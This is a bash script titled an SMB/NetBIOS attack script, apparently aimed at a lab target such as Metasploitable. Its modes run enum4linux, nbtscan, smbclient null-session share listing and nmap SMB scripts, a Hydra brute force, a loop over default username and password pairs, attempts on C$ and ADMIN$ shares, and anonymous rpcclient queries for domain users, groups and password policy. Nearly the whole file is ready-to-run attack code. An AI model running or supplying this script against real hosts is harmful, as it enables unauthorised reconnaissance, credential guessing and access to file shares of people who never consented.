#!/bin/bash
###############################################################################
# SMB/NetBIOS Attack Script
# enum4linux, smbclient, nbtscan, SMB brute force
###############################################################################

SUBTYPE="${1:-enum}"
TARGET_IP="${2:-10.10.40.20}"
TARGET_PORT="${3:-445}"
RESULTS_DIR="${4:-.}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLISTS_DIR="${SCRIPT_DIR}/wordlists"

mkdir -p "$RESULTS_DIR"

echo "[*] SMB attacks: $SUBTYPE against ${TARGET_IP}:${TARGET_PORT}"

run_enum() {
    echo "[*] SMB enumeration"

    # enum4linux full enumeration
    echo "[*] Running enum4linux..."
    enum4linux -a "$TARGET_IP" > "${RESULTS_DIR}/enum4linux.txt" 2>&1 || true

    # nbtscan
    echo "[*] Running nbtscan..."
    nbtscan -r "${TARGET_IP}/32" > "${RESULTS_DIR}/nbtscan.txt" 2>&1 || true

    # smbclient list shares (null session)
    echo "[*] Listing shares via null session..."
    smbclient -L "//${TARGET_IP}" -N > "${RESULTS_DIR}/smb_shares.txt" 2>&1 || true

    # Nmap SMB scripts
    echo "[*] Running nmap SMB scripts..."
    nmap -p 139,445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-protocols \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_smb.txt" 2>&1 || true

    # SMB version detection
    nmap -p 445 --script=smb2-security-mode "$TARGET_IP" -oN "${RESULTS_DIR}/smb2_security.txt" 2>&1 || true

    echo "[+] SMB enumeration complete"
}

run_brute() {
    echo "[*] SMB credential brute force"

    # Hydra SMB brute force
    hydra -L "${WORDLISTS_DIR}/small_users.txt" \
          -P "${WORDLISTS_DIR}/small_passwords.txt" \
          -t 4 -f \
          "${TARGET_IP}" smb 2>&1 | tee "${RESULTS_DIR}/smb_brute.txt" || true

    # Try common SMB credentials manually
    local users=("administrator" "admin" "guest" "msfadmin" "root")
    local passwords=("" "password" "admin" "msfadmin" "123456")

    for user in "${users[@]}"; do
        for pass in "${passwords[@]}"; do
            smbclient -L "//${TARGET_IP}" -U "${user}%${pass}" -c "exit" 2>/dev/null || true
            sleep 0.5
        done
    done

    echo "[+] SMB brute force complete"
}

run_relay() {
    echo "[*] SMB relay simulation"

    # Attempt to access shares with captured credentials
    local test_shares=("C$" "ADMIN$" "IPC$" "tmp" "public" "share" "homes")

    for share in "${test_shares[@]}"; do
        echo "[*] Testing share: //${TARGET_IP}/${share}"
        smbclient "//${TARGET_IP}/${share}" -N -c "ls" 2>/dev/null || true
        sleep 1
    done

    # Try with known credentials
    for share in "${test_shares[@]}"; do
        smbclient "//${TARGET_IP}/${share}" -U "msfadmin%msfadmin" -c "ls" 2>/dev/null || true
        sleep 0.5
    done

    # rpcclient enumeration
    echo "[*] RPC client enumeration..."
    rpcclient -U "" -N "$TARGET_IP" -c "enumdomusers" 2>/dev/null || true
    rpcclient -U "" -N "$TARGET_IP" -c "enumdomgroups" 2>/dev/null || true
    rpcclient -U "" -N "$TARGET_IP" -c "getdompwinfo" 2>/dev/null || true

    echo "[+] SMB relay simulation complete"
}

case "$SUBTYPE" in
    enum)   run_enum ;;
    brute)  run_brute ;;
    relay)  run_relay ;;
    full)
        run_enum
        sleep 5
        run_brute
        sleep 5
        run_relay
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: enum, brute, relay, full"
        exit 1
        ;;
esac

echo "[*] SMB attack script complete"
